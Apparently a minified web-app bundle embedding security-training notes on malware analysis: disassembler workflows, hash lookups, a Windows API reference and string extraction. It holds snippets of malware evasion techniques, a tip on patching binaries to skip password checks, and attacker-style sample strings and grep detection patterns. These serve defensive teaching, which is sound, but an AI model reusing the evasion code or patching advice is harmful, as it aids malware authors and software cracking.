${i.pathname===e.to?`active`:``}`,children:e.label})},e.to))}),(0,G.jsxs)(`div`,{className:`hidden lg:flex socials border-x px-4 mx-2`,style:{borderColor:e?`var(--color-dm-border)`:`var(--color-border)`},children:[(0,G.jsx)(`a`,{href:`https://github.com/f4zzie`,target:`_blank`,rel:`noreferrer`,children:(0,G.jsx)(zp,{size:18})}),(0,G.jsx)(`a`,{href:`https://x.com/_lazerguard`,target:`_blank`,rel:`noreferrer`,children:(0,G.jsx)(`svg`,{viewBox:`0 0 24 24`,className:`w-[18px] h-[18px] fill-current`,children:(0,G.jsx)(`path`,{d:`M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z`})})})]}),(0,G.jsx)(`button`,{onClick:t,className:`icon-button ml-1 mr-1 sm:ml-2`,style:{color:e?`#f3f4f6`:`#111827`},"aria-label":`Toggle theme`,children:e?(0,G.jsx)(Xp,{size:20}):(0,G.jsx)(Wp,{size:20})}),(0,G.jsx)(Tn,{to:`/notes`,className:`hidden sm:inline-flex h-10 w-10 items-center justify-center rounded-lg bg-primary text-white dark:bg-dm-primary`,"aria-label":`Search notes`,children:(0,G.jsx)(Kp,{size:18})}),(0,G.jsx)(`button`,{onClick:()=>r(!0),className:`lg:hidden inline-flex h-10 w-10 items-center justify-center rounded-lg bg-primary text-white dark:bg-dm-primary`,"aria-label":`Open menu`,children:(0,G.jsx)(Up,{size:20})})]})]})}),(0,G.jsx)(K,{children:n&&(0,G.jsxs)(G.Fragment,{children:[(0,G.jsx)(xp.div,{initial:{opacity:0},animate:{opacity:1},exit:{opacity:0},className:`fixed inset-0 z-50 bg-black/50`,onClick:()=>r(!1)}),(0,G.jsxs)(xp.div,{initial:{x:`100%`},animate:{x:0},exit:{x:`100%`},transition:{type:`tween`,duration:.3},className:`fixed right-0 top-0 z-50 h-screen w-full max-w-[400px] border-l p-6`,style:{backgroundColor:e?`var(--color-dm-body)`:`var(--color-body)`,borderColor:e?`var(--color-dm-border)`:`var(--color-dark)`},children:[(0,G.jsx)(`button`,{onClick:()=>r(!1),className:`absolute right-4 top-4 p-2`,style:{color:e?`#fff`:`var(--color-dark)`},children:(0,G.jsx)(em,{size:24})}),(0,G.jsx)(`ul`,{className:`mt-16 space-y-2`,children:tm.map(e=>(0,G.jsx)(`li`,{children:(0,G.jsx)(Tn,{to:e.to,onClick:()=>r(!1),className:`nav-link block text-lg font-bold ${i.pathname===e.to?`active`:``}`,children:e.label})},e.to))}),(0,G.jsxs)(`div`,{className:`socials mt-8 justify-start border-0`,children:[(0,G.jsx)(`a`,{href:`https://github.com/f4zzie`,target:`_blank`,rel:`noreferrer`,children:(0,G.jsx)(zp,{size:20})}),(0,G.jsx)(`a`,{href:`https://x.com/_lazerguard`,target:`_blank`,rel:`noreferrer`,children:(0,G.jsx)(`svg`,{viewBox:`0 0 24 24`,className:`w-5 h-5 fill-current`,children:(0,G.jsx)(`path`,{d:`M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z`})})})]})]})]})})]})}var rm=[{id:`advanced-static-ana`,title:`Advanced Static Analysis`,excerpt:`Deep dive into advanced static analysis techniques including IDA Pro disassembly, Ghidra decompilation, and identifying malicious code patterns without executing the binary.`,category:`Malware Analysis`,content:`# Advanced Static Analysis

> **Goal**: Understand what a binary does **without ever running it** — using disassemblers, decompilers, and manual code analysis.

---

## 1. Tool Selection — Which Disassembler to Use

| Tool | Type | Best For | Cost |
|------|------|----------|------|
| **Ghidra** | Disassembler + Decompiler | Full RE, malware, CTF | Free (NSA) |
| **IDA Pro** | Disassembler + Decompiler | Industry standard, best x86 analysis | $$$$ |
| **IDA Free** | Disassembler only | Quick disassembly, no decompiler | Free |
| **Cutter / Rizin** | Disassembler + Decompiler (r2-based) | Lightweight, Linux-friendly, CTF | Free |
| **Binary Ninja** | Disassembler + Decompiler | Clean UI, good HLIL | $$ |
| **x64dbg** | Debugger (dynamic) | Runtime analysis on Windows | Free |
| **radare2** | CLI Disassembler | Scripting, automation, CTF | Free |

---

## 2. Loading a Binary into Cutter / Ghidra

### Cutter Workflow
1. Open Cutter and load \`FileName.exe\`
2. Select analysis options (keep defaults for most malware)
3. Wait for auto-analysis to complete
4. Locate the **main** function — this is the entry point of the program
5. Switch between **Disassembly**, **Graph**, and **Decompiler** views

### Ghidra Workflow
1. Create a new project → Import File → select the binary
2. Double-click the file → opens CodeBrowser
3. Say **Yes** to auto-analysis when prompted
4. Navigate to \`entry\` → follow call to \`__libc_start_main\` → first argument = \`main\`
5. Use the **Decompile** window (right panel) to read pseudo-C code

---

## 3. Identifying Key Functions

### Finding \`main()\`
- **PE (Windows)**: Look for \`entry\` → \`__mainCRTStartup\` → \`main\` or \`WinMain\`
- **ELF (Linux)**: \`entry\` → \`__libc_start_main(main, argc, argv, ...)\` — first arg is \`main\`
- **Stripped binaries**: No symbol names — look for the function called by the entry stub

### Recognizing Important Functions
| What You See | What It Probably Does |
|---|---|
| \`CreateFile\` / \`WriteFile\` | File operations (dropper, ransomware) |
| \`VirtualAlloc\` + \`memcpy\` | Shellcode unpacking/injection |
| \`socket\` / \`connect\` / \`send\` / \`recv\` | Network C2 communication |
| \`RegSetValueEx\` | Registry persistence |
| \`CreateProcess\` / \`ShellExecute\` | Spawning child processes |
| \`CryptEncrypt\` / \`CryptDecrypt\` | Crypto operations (ransomware) |
| XOR loops in a tight function | Custom encryption / obfuscation |
| \`LoadLibrary\` + \`GetProcAddress\` | Dynamic API resolution (evasion) |
| \`IsDebuggerPresent\` | Anti-debugging check |

---

## 4. Control Flow Analysis

### Reading the Graph View
The **graph view** (CFG — Control Flow Graph) shows basic blocks connected by arrows:
- **Green arrow** = conditional branch TAKEN (true)
- **Red arrow** = conditional branch NOT TAKEN (false)
- **Blue arrow** = unconditional jump

### Common Patterns in Graph View

**If/Else:**
\`\`\`
   [cmp eax, 0]
   /          \\
 [jne]      [je]
  |           |
[block A]  [block B]
  \\          /
   [continue]
\`\`\`

**While Loop:**
\`\`\`
[condition check] <----+
       |               |
   [loop body] --------+
       |
   [exit loop]
\`\`\`

**Switch/Case:**
\`\`\`
[cmp/ja → jump table]
  / | | | \\
[c0][c1][c2][c3][default]
\`\`\`

---

## 5. String Analysis in Disassemblers

### Where to Find Strings
- **Ghidra**: Window → Defined Strings (or \`Search → For Strings\`)
- **Cutter**: Strings panel (izz/iz)
- **IDA**: View → Open Subviews → Strings (Shift+F12)

### What Strings Reveal
| String Pattern | Intelligence |
|---|---|
| \`http://\`, \`https://\` | C2 server URLs |
| \`cmd.exe\`, \`/bin/sh\` | Shell command execution |
| \`HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\` | Persistence registry key |
| \`password\`, \`credential\`, \`login\` | Credential stealer |
| \`encrypt\`, \`decrypt\`, \`AES\`, \`RSA\` | Crypto/ransomware |
| Base64 blobs (\`=\` padding) | Encoded payloads or configs |
| \`mutex_\`, \`Global\\\` | Mutex for singleton check |
| Error messages with developer paths | Developer machine info leak |
| \`.onion\`, \`tor\` | Tor-based C2 |

---

## 6. Import & Export Analysis

### Imports Table
The Import Address Table (IAT) tells you which DLL functions the binary uses **statically**:

**In Ghidra**: Window → Symbol Table → filter by "EXTERNAL"  
**In Cutter**: Imports panel  
**In IDA**: View → Open Subviews → Imports

### Suspicious Import Combinations

| Import Combination | Likely Behavior |
|---|---|
| \`VirtualAllocEx\` + \`WriteProcessMemory\` + \`CreateRemoteThread\` | Process injection |
| \`OpenProcess\` + \`ReadProcessMemory\` | Memory reading (credential theft) |
| \`InternetOpenA\` + \`InternetConnectA\` + \`HttpSendRequestA\` | HTTP C2 |
| \`WSAStartup\` + \`socket\` + \`connect\` | Raw socket C2 |
| \`CryptAcquireContext\` + \`CryptEncrypt\` | Encryption (ransomware) |
| Only \`LoadLibrary\` + \`GetProcAddress\` | Dynamic resolution — hiding real API usage |
| \`NtQuerySystemInformation\` | Anti-analysis / system enumeration |

### Exports Table
- Legitimate DLLs export functions for other programs to use
- **Malicious DLLs** often export functions like \`DllMain\`, \`ServiceMain\`, or names that mimic legit software
- Look for exported functions with suspicious names or ordinals-only exports

---

## 7. Cross-References (XREF) Analysis

Cross-references show **who calls a function** and **what a function calls**:

- **Ghidra**: Right-click → References → Show References To
- **IDA**: Press \`x\` on any function/address
- **Cutter**: Right-click → Show X-Refs

### Why XREFs Matter
- Find all callers of \`VirtualAlloc\` → trace shellcode allocation
- Find all callers of \`send()\` → trace C2 exfiltration
- Find what calls a decryption function → trace payload unpacking
- Dead code (functions with 0 XREFs) → possibly unused or dynamically resolved

---

## 8. Identifying Packed / Obfuscated Binaries

### Signs of Packing
| Indicator | What It Means |
|---|---|
| Very few imports (only \`LoadLibrary\`, \`GetProcAddress\`) | Packed — real imports resolved at runtime |
| Section names like \`.upx0\`, \`.aspack\`, \`.themida\` | Known packer sections |
| High entropy (>7.0) in sections | Compressed/encrypted data |
| Virtual size >> raw size in PE sections | Unpacking will expand data in memory |
| Entry point in non-standard section (not \`.text\`) | Stub executes before real code |
| Very few strings | Strings encrypted or compressed |

### Common Packers
| Packer | Detection | Unpacking |
|---|---|---|
| **UPX** | \`upx -t file.exe\`, section names \`.UPX0/.UPX1\` | \`upx -d file.exe\` |
| **ASPack** | PEiD, Detect It Easy | Manual or ASPackDie |
| **Themida** | PEiD, section \`.themida\` | Very hard, use dynamic analysis |
| **VMProtect** | \`.vmp\` sections, virtualized code | Extremely hard |
| **Custom packers** | No signature match, weird entropy | Dump from memory at OEP |

### Entropy Analysis
- **Normal code** (.text section): entropy ~5.0–6.5
- **Packed/encrypted**: entropy ~7.0–8.0
- Use **Detect It Easy (DiE)** or **pestudio** for entropy visualization

---

## 9. Advanced Techniques

### Identifying Encryption Algorithms
- Look for **magic constants**:
  - \`0x67452301\`, \`0xEFCDAB89\` → MD5
  - \`0x6A09E667\` → SHA-256
  - Rijndael S-box (\`0x63, 0x7C, 0x77, 0x7B...\`) → AES
  - \`0x9E3779B9\` → TEA/XTEA
- **Ghidra**: Use \`FindCrypt\` plugin to auto-detect crypto constants
- **IDA**: Use \`FindCrypt2\` or \`Signsrch\`

### Reconstructing Structures
1. Identify clusters of data accesses at fixed offsets from a base pointer
2. Create a struct in Ghidra: Data Type Manager → right-click → New Structure
3. Apply the struct to the pointer → code becomes readable

### Patching Binaries
- **Ghidra**: Right-click instruction → Patch Instruction → Export patched binary
- **Cutter**: Edit → Patch → write bytes
- Common patches: \`NOP\` out anti-debug checks, change \`JE\` to \`JMP\` to skip password checks

---

## 10. Static Analysis Workflow Checklist

\`\`\`
□ 1. File identification (file, DIE, PEiD)
□ 2. Check if packed → unpack if needed
□ 3. Hash the sample (MD5/SHA256) → check VirusTotal
□ 4. Extract strings (strings/FLOSS)
□ 5. Analyze imports/exports → categorize behavior
□ 6. Load into disassembler (Ghidra/IDA/Cutter)
□ 7. Find entry point → locate main()
□ 8. Read decompiled code for high-level understanding
□ 9. Follow XREFs for critical functions
□ 10. Identify crypto, C2, persistence, injection
□ 11. Extract IOCs (IPs, domains, file paths, registry keys)
□ 12. Document findings → write report
\`\`\`

---

## Pro Tips

> **Rename everything** — As you identify functions, rename them (\`decrypt_payload\`, \`connect_c2\`, \`inject_shellcode\`). Future you will thank present you.

> **Comment liberally** — Add comments in the disassembler for every discovery. Analysis is iterative.

> **Cross-reference with dynamic analysis** — Static tells you what CAN happen. Dynamic tells you what DOES happen. Use both.

> **Use YARA rules** — Write YARA signatures from your static findings to detect variants of the same malware family.`},{id:`md5-check`,title:`MD5 Hash Verification`,excerpt:`Using MD5 hashes for malware identification and verification, including command-line tools and online lookup databases like VirusTotal.`,category:`Malware Analysis`,content:`# MD5 Hash Verification

> **Purpose**: Generate a unique fingerprint of a file to identify it, check if it's known malware, and verify integrity.

---

## 1. Quick Commands

### Windows (Cmder / PowerShell)
\`\`\`powershell
# Using md5sum (Cmder / Git Bash / WSL)
md5sum.exe FileName.exe

# Using PowerShell native
Get-FileHash -Algorithm MD5 FileName.exe

# Using certutil
certutil -hashfile FileName.exe MD5
\`\`\`

### Linux / macOS
\`\`\`bash
# Standard
md5sum FileName.exe

# macOS
md5 FileName.exe

# OpenSSL
openssl md5 FileName.exe
\`\`\`

---

## 2. What is MD5?

- **MD5** (Message-Digest Algorithm 5) produces a **128-bit** (32 hex character) hash
- Designed by Ron Rivest in 1991
- **Deterministic**: Same input → same hash, always
- **One-way**: Cannot reverse a hash back to the original file
- **Fast**: Very quick to compute even on large files

### Example Output
\`\`\`
d41d8cd98f00b204e9800998ecf8427e  empty_file.txt
5d41402abc4b2a76b9719d911017c592  hello.txt
a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6  malware_sample.exe
\`\`\`

---

## 3. MD5 vs SHA-256 — When to Use Which

| Feature | MD5 | SHA-256 |
|---|---|---|
| **Hash length** | 128-bit (32 hex chars) | 256-bit (64 hex chars) |
| **Speed** | Faster | Slower |
| **Collision resistance** | **BROKEN** (collisions found since 2004) | Strong (no known collisions) |
| **Use in malware analysis** | Still widely used for quick lookups | Preferred for authoritative identification |
| **VirusTotal** | Accepted | Accepted (primary) |
| **NIST recommendation** | Deprecated for security | Recommended |

### Bottom Line
- **MD5**: Still widely supported in older tools/scripts, smaller/faster to store/type, sufficient for non-adversarial contexts (quick malware lookup)
- **SHA-256**: The authoritative, collision-resistant identifier — use this when you need **certainty**
- **Best practice**: Generate BOTH for every sample you analyze

---

## 4. Using Hashes for Malware Analysis

### Step 1: Generate the Hash
\`\`\`bash
md5sum suspicious_file.exe
# Output: a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6  suspicious_file.exe
\`\`\`

### Step 2: Look Up on VirusTotal
1. Go to [https://www.virustotal.com](https://www.virustotal.com)
2. Click **Search** tab
3. Paste the MD5 hash
4. Review detection results from 70+ AV engines

### Step 3: Search Threat Intelligence Databases
| Platform | URL | What It Provides |
|---|---|---|
| **VirusTotal** | [virustotal.com](https://www.virustotal.com) | AV detections, behavioral reports, community comments |
| **MalwareBazaar** | [bazaar.abuse.ch](https://bazaar.abuse.ch) | Malware sample database, family tags |
| **Hybrid Analysis** | [hybrid-analysis.com](https://www.hybrid-analysis.com) | Sandbox reports with full behavioral data |
| **ANY.RUN** | [any.run](https://any.run) | Interactive sandbox reports |
| **AlienVault OTX** | [otx.alienvault.com](https://otx.alienvault.com) | Threat intelligence pulses |
| **Malshare** | [malshare.com](https://malshare.com) | Free malware sample repository |
| **Joe Sandbox** | [joesandbox.com](https://www.joesandbox.com) | Detailed sandbox analysis |
| **InQuest Labs** | [labs.inquest.net](https://labs.inquest.net) | Deep file inspection |

### Step 4: Check if Previously Analyzed
\`\`\`bash
# Search multiple databases at once using curl
curl -s "https://mb-api.abuse.ch/api/v1/" \\
  -d "query=get_info" \\
  -d "hash=a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6"
\`\`\`

---

## 5. Bulk Hashing

### Hash All Files in a Directory
\`\`\`bash
# Linux
find . -type f -exec md5sum {} \\; > hashes.txt

# Hash only executables
find . -name "*.exe" -exec md5sum {} \\; > exe_hashes.txt

# Generate both MD5 and SHA256
for f in *.exe; do
    echo "=== $f ==="
    md5sum "$f"
    sha256sum "$f"
done
\`\`\`

### PowerShell Bulk Hashing
\`\`\`powershell
Get-ChildItem -Path . -Filter *.exe | ForEach-Object {
    $md5 = (Get-FileHash $_.FullName -Algorithm MD5).Hash
    $sha256 = (Get-FileHash $_.FullName -Algorithm SHA256).Hash
    Write-Output "$($_.Name): MD5=$md5 SHA256=$sha256"
}
\`\`\`

---

## 6. OSINT Pivoting with Hashes

Once you have a hash, you can **pivot** to find related malware:

\`\`\`
Hash → VirusTotal → "Relations" tab → 
  → Contacted domains/IPs
  → Dropped files (hashes of children)
  → Parent files (who dropped this)
  → Similar samples (same family)
  → Bundled files
\`\`\`

### Hash-Based YARA Rule
\`\`\`yara
rule known_malware_sample {
    condition:
        hash.md5(0, filesize) == "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6" or
        hash.sha256(0, filesize) == "e3b0c44298fc1c149afbf4c8996fb924..."
}
\`\`\`

---

## 7. MD5 Collision Warning

> **Important**: MD5 is cryptographically broken. Two different files CAN produce the same MD5 hash (collision attacks). This means:
> - An attacker could craft a malicious file with the same MD5 as a legitimate one
> - Never rely on MD5 alone for file verification in security contexts
> - Always use SHA-256 as primary identifier, MD5 as secondary for quick lookups

### Famous MD5 Collision Examples
- **2004**: Wang et al. demonstrated first MD5 collisions
- **2012**: Flame malware used MD5 collision to forge a Microsoft certificate
- **2017**: SHAttered project showed practical SHA-1 collisions (MD5 was already broken)`},{id:`malware-api`,title:`Malware API Reference`,excerpt:`Analysis of common Windows API calls used by malware for file operations, process manipulation, registry modifications, and network communication.`,category:`Malware Analysis`,content:`# Malware API Reference

> **Primary Resource**: [https://malapi.io](https://malapi.io) — Interactive Windows API reference organized by malware behavior categories.

---

## 1. What is MalAPI.io?

MalAPI.io is a **curated database** of Windows API functions commonly abused by malware, organized by **ATT&CK technique categories**. It maps each API to:
- What it does
- Which malware families use it
- What MITRE ATT&CK technique it corresponds to
- Example usage patterns

### How to Use It
1. Go to [https://malapi.io](https://malapi.io)
2. Browse by **category** (Injection, Evasion, Persistence, etc.) or **search** a specific API name
3. Click any API to see: description, parameters, related malware, detection notes
4. Use it alongside your disassembler — when you see an unknown API in imports, look it up on MalAPI

---

## 2. API Categories & Key Functions

### Process Injection APIs
| API Function | Description | Risk Level |
|---|---|---|
| \`VirtualAllocEx\` | Allocate memory in another process | High |
| \`WriteProcessMemory\` | Write data into another process's memory | Critical |
| \`CreateRemoteThread\` | Create a thread in another process | Critical |
| \`NtMapViewOfSection\` | Map a section object into a process (stealthy) | Critical |
| \`QueueUserAPC\` | Queue an APC to a thread (APC injection) | High |
| \`SetThreadContext\` | Modify thread registers (thread hijacking) | Critical |
| \`NtCreateThreadEx\` | Low-level thread creation (ntdll) | Critical |
| \`RtlCreateUserThread\` | Another thread creation (used to bypass hooks) | Critical |

### Memory Manipulation APIs
| API Function | Description | Risk Level |
|---|---|---|
| \`VirtualAlloc\` | Allocate memory in current process | Medium |
| \`VirtualProtect\` | Change memory page protections (RWX) | High |
| \`HeapCreate\` / \`HeapAlloc\` | Heap allocation (shellcode staging) | Medium |
| \`NtAllocateVirtualMemory\` | Low-level memory allocation | High |
| \`VirtualFree\` | Free allocated memory | Low |

### Evasion & Anti-Analysis APIs
| API Function | Description | What Malware Does |
|---|---|---|
| \`IsDebuggerPresent\` | Check if debugger attached | Exit or change behavior |
| \`CheckRemoteDebuggerPresent\` | Check for remote debugger | Same as above |
| \`NtQueryInformationProcess\` | Query debug port, flags | Detect debugger/sandbox |
| \`GetTickCount\` / \`QueryPerformanceCounter\` | Get system time | Timing-based sandbox detection |
| \`NtDelayExecution\` / \`Sleep\` | Delay execution | Sandbox evasion (sleep > analysis time) |
| \`OutputDebugStringA\` | Send string to debugger | Crash certain debuggers |
| \`NtSetInformationThread\` | Hide thread from debugger | \`ThreadHideFromDebugger\` |
| \`GetSystemInfo\` | Get CPU/RAM info | Detect VM (low resources = sandbox) |
| \`EnumWindows\` | List all windows | Check for analysis tools |

### Persistence APIs
| API Function | Description | Persistence Method |
|---|---|---|
| \`RegCreateKeyExA\` | Create registry key | Run key persistence |
| \`RegSetValueExA\` | Set registry value | Write to \`HKCU\\...\\Run\` |
| \`CreateServiceA\` | Create a Windows service | Service persistence |
| \`StartServiceA\` | Start a service | Activate persistence |
| \`CopyFileA\` | Copy file to new location | Drop to startup folder |
| \`SHGetFolderPathA\` | Get special folder paths | Find Startup folder |
| \`CoCreateInstance\` | Create COM object | COM hijacking |

### File Operations APIs
| API Function | Description | Malware Use |
|---|---|---|
| \`CreateFileA/W\` | Open/create file | Drop payloads |
| \`WriteFile\` | Write data to file | Write malicious content |
| \`ReadFile\` | Read file contents | Read config/steal data |
| \`DeleteFileA\` | Delete a file | Self-deletion, anti-forensics |
| \`MoveFileA\` | Move/rename file | Relocate payload |
| \`FindFirstFile\` / \`FindNextFile\` | Directory enumeration | Ransomware file discovery |
| \`GetTempPathA\` | Get temp directory | Common drop location |

### Network Communication APIs
| API Function | Description | Protocol |
|---|---|---|
| \`WSAStartup\` | Initialize Winsock | Raw sockets |
| \`socket\` / \`connect\` / \`send\` / \`recv\` | Raw socket operations | TCP/UDP C2 |
| \`InternetOpenA\` | Initialize WinINet | HTTP/HTTPS |
| \`InternetConnectA\` | Connect to server | HTTP C2 |
| \`HttpOpenRequestA\` | Create HTTP request | HTTP C2 |
| \`HttpSendRequestA\` | Send HTTP request | Exfiltration |
| \`WinHttpOpen\` | Initialize WinHTTP (modern) | HTTPS C2 |
| \`URLDownloadToFileA\` | Download file from URL | Stage 2 download |
| \`InternetReadFile\` | Read response data | Receive C2 commands |

### Credential Theft APIs
| API Function | Description | What It Steals |
|---|---|---|
| \`CredEnumerateA\` | Enumerate stored credentials | Windows credential store |
| \`CryptUnprotectData\` | Decrypt DPAPI-protected data | Browser passwords, cookies |
| \`LsaRetrievePrivateData\` | Retrieve LSA secrets | Service passwords |
| \`OpenProcessToken\` | Open process token | Token theft |
| \`DuplicateTokenEx\` | Duplicate access token | Token impersonation |
| \`ImpersonateLoggedOnUser\` | Impersonate user | Privilege escalation |

### Crypto APIs
| API Function | Description | Malware Use |
|---|---|---|
| \`CryptAcquireContextA\` | Get crypto provider handle | Initialize encryption |
| \`CryptGenKey\` | Generate encryption key | Ransomware key gen |
| \`CryptEncrypt\` | Encrypt data | Ransomware file encryption |
| \`CryptDecrypt\` | Decrypt data | Decrypt config/C2 traffic |
| \`CryptImportKey\` | Import crypto key | Import attacker's public key |
| \`BCryptEncrypt\` | Modern crypto (CNG) | Newer ransomware |

---

## 3. API Resolution Techniques (How Malware Hides APIs)

### Static Linking (Normal)
\`\`\`c
// Visible in Import Address Table
CreateRemoteThread(hProcess, NULL, 0, lpStartAddress, lpParameter, 0, NULL);
\`\`\`
**Detection**: Clearly visible in IAT — easy to spot in PE-bear, IDA, Ghidra

### Dynamic Resolution (Common Evasion)
\`\`\`c
// Only LoadLibrary + GetProcAddress visible in IAT
HMODULE hKernel = LoadLibrary("kernel32.dll");
typedef HANDLE (*pCreateRemoteThread)(...);
pCreateRemoteThread myFunc = (pCreateRemoteThread)GetProcAddress(hKernel, "CreateRemoteThread");
myFunc(hProcess, NULL, 0, lpStartAddress, lpParameter, 0, NULL);
\`\`\`
**Detection**: Only see \`LoadLibrary\` + \`GetProcAddress\` in IAT — must trace runtime resolution

### API Hashing (Advanced Evasion)
\`\`\`c
// No API names at all in the binary
DWORD hash = 0xAFC1B2D3;  // pre-computed hash of "CreateRemoteThread"
FARPROC func = resolve_api_by_hash(hash);  // walks PEB → DLL list → export table
func(hProcess, NULL, 0, lpStartAddress, lpParameter, 0, NULL);
\`\`\`
**Detection**: No strings, no IAT entries — must reverse the hashing function. Common hash algorithms: \`djb2\`, \`ror13\`, \`crc32\`

### Direct Syscalls (Most Advanced)
\`\`\`asm
; Bypass all user-mode hooks entirely
mov r10, rcx
mov eax, 0x3F          ; NtCreateThreadEx syscall number
syscall
\`\`\`
**Detection**: Look for \`syscall\` instructions with hardcoded syscall numbers. Tools: **SysWhispers**, **HellsGate**, **Tartarus Gate**

---

## 4. Quick Analysis Workflow Using MalAPI

\`\`\`
1. Extract imports from binary (PE-bear, CFF Explorer, Ghidra)
2. For each suspicious import → search on malapi.io
3. Group imports by malware behavior category:
   □ Injection?  □ Persistence?  □ Network?
   □ Evasion?    □ File ops?     □ Crypto?
4. If only LoadLibrary + GetProcAddress → it's hiding real APIs
5. Cross-reference with strings analysis (FLOSS output)
6. Map to MITRE ATT&CK techniques
7. Write behavioral summary
\`\`\`

---

## 5. Essential Online API Lookup Resources

| Resource | URL | Use Case |
|---|---|---|
| **MalAPI.io** | [malapi.io](https://malapi.io) | Malware-focused API reference |
| **MSDN** | [learn.microsoft.com](https://learn.microsoft.com/en-us/windows/win32/api/) | Official API documentation |
| **Undocumented NtAPI** | [ntdoc.m417z.com](https://ntdoc.m417z.com/) | Undocumented ntdll functions |
| **ReactOS Source** | [reactos.org](https://reactos.org/) | Open-source Windows API implementation |
| **MITRE ATT&CK** | [attack.mitre.org](https://attack.mitre.org/) | Map APIs to threat techniques |
| **Unprotect.it** | [unprotect.it](https://unprotect.it/) | Evasion & anti-analysis techniques |

`},{id:`strings`,title:`Strings Extraction & Analysis`,excerpt:`Extracting and analyzing strings from malware samples using the strings utility and FLOSS for deobfuscating encoded or obfuscated strings.`,category:`Malware Analysis`,content:`# Strings Extraction & Analysis

> **Purpose**: Extract human-readable text from binaries to discover URLs, file paths, commands, error messages, encryption keys, and other intelligence — **without executing the binary**.

---

## 1. Quick Commands

### FLOSS (FireEye Labs Obfuscated String Solver) — Best Tool
\`\`\`bash
# Basic extraction (includes deobfuscated strings)
floss fileName.exe

# Check the FLOSS static unicode strings at the bottom
# These often contain the most interesting artifacts

# Output to file for easier searching
floss fileName.exe > strings_output.txt

# Verbose mode (see decoding attempts)
floss -v fileName.exe

# Minimum string length (default is 4)
floss -n 8 fileName.exe
\`\`\`

### Traditional \`strings\` Command
\`\`\`bash
# ASCII strings (default)
strings fileName.exe

# Unicode strings (Windows uses UTF-16LE)
strings -e l fileName.exe

# Both ASCII and Unicode
strings -a fileName.exe && strings -e l fileName.exe

# Set minimum length (reduce noise)
strings -n 8 fileName.exe

# With byte offset (useful for locating in hex editor)
strings -t x fileName.exe
\`\`\`

---

## 2. FLOSS vs strings — Why FLOSS Wins

| Feature | \`strings\` | **FLOSS** |
|---|---|---|
| ASCII strings | Yes | Yes |
| Unicode strings | With \`-e l\` flag | Automatic |
| **Decoded/deobfuscated strings** | **No** | **Yes** |
| **Stack strings** (built char-by-char) | **No** | **Yes** |
| **Tight strings** (XOR decoded) | **No** | **Yes** |
| Speed | Very fast | Slower (does emulation) |
| Install | Pre-installed | \`pip install floss\` or download binary |

> **FLOSS uses emulation** to actually execute string decoding routines, revealing strings that \`strings\` can never find.

### Install FLOSS
\`\`\`bash
# Via pip
pip install floss

# Or download binary from GitHub
# https://github.com/mandiant/flare-floss/releases
\`\`\`

---

## 3. What to Look For in String Output

### High-Value String Categories

| Category | Example Strings | Intelligence |
|---|---|---|
| **URLs / Domains** | \`http://evil.com/gate.php\`, \`api.telegram.org\` | C2 servers, exfil endpoints |
| **IP Addresses** | \`192.168.1.100\`, \`10.0.0.1:4444\` | C2 IPs, callback addresses |
| **File Paths** | \`C:\\Users\\Public\\payload.dll\`, \`/tmp/.hidden\` | Drop locations |
| **Registry Keys** | \`HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\` | Persistence mechanisms |
| **Commands** | \`cmd.exe /c\`, \`powershell -enc\`, \`whoami\`, \`net user\` | Execution commands |
| **API Names** | \`VirtualAlloc\`, \`CreateRemoteThread\` | Dynamic API resolution |
| **DLL Names** | \`kernel32.dll\`, \`ntdll.dll\`, \`ws2_32.dll\` | Loaded libraries |
| **Error Messages** | \`Connection failed\`, \`File not found\` | Developer debug messages |
| **Crypto Constants** | \`-----BEGIN RSA PUBLIC KEY-----\` | Encryption usage |
| **User Agents** | \`Mozilla/5.0...\`, \`Go-http-client/1.1\` | HTTP fingerprint |
| **Mutex Names** | \`Global\\MyMutex123\` | Singleton check |
| **Base64 Blobs** | \`SGVsbG8gV29ybGQ=\` | Encoded payloads/configs |
| **Passwords / Keys** | \`admin:password123\`, \`AES_KEY=\` | Hardcoded credentials |
| **Developer Artifacts** | \`C:\\Users\\dev\\Desktop\\malware\\\` | Attacker machine info |

---

## 4. String Analysis Methodology

### Step-by-Step Workflow
\`\`\`
1. Run FLOSS on the sample
   └── floss sample.exe > floss_output.txt

2. Sort by categories using grep
   └── grep -iE "http|https|ftp|\\.com|\\.net|\\.org" floss_output.txt
   └── grep -iE "\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\b" floss_output.txt
   └── grep -iE "HKLM|HKCU|CurrentVersion|Run" floss_output.txt
   └── grep -iE "cmd|powershell|exec|system|shell" floss_output.txt
   └── grep -iE "password|credential|login|token|key" floss_output.txt

3. Decode any Base64 strings
   └── echo "SGVsbG8gV29ybGQ=" | base64 -d

4. Extract IOCs (Indicators of Compromise)
   └── IPs, domains, file hashes, mutex names, file paths

5. Cross-reference with threat intelligence
   └── VirusTotal, MalwareBazaar, OTX
\`\`\`

### Useful grep Patterns for Malware Analysis
\`\`\`bash
# Network indicators
grep -oP 'https?://[^\\s"<>]+' floss_output.txt
grep -oP '\\b\\d{1,3}(\\.\\d{1,3}){3}\\b' floss_output.txt
grep -oP '\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Z|a-z]{2,}\\b' floss_output.txt

# Windows paths
grep -oP '[A-Z]:\\\\[^\\s"]+' floss_output.txt

# Registry keys
grep -iP '(HKLM|HKCU|HKCR)\\\\[^\\s"]+' floss_output.txt

# Base64 encoded strings (min length 20)
grep -oP '[A-Za-z0-9+/]{20,}={0,2}' floss_output.txt

# Potential encryption keys (hex strings)
grep -oP '\\b[0-9a-fA-F]{32,}\\b' floss_output.txt
\`\`\`

---

## 5. Obfuscated Strings — What FLOSS Catches

### Stack Strings
Malware builds strings one character at a time on the stack to avoid detection:
\`\`\`c
// In the binary (no complete strings visible to \`strings\`)
char s[20];
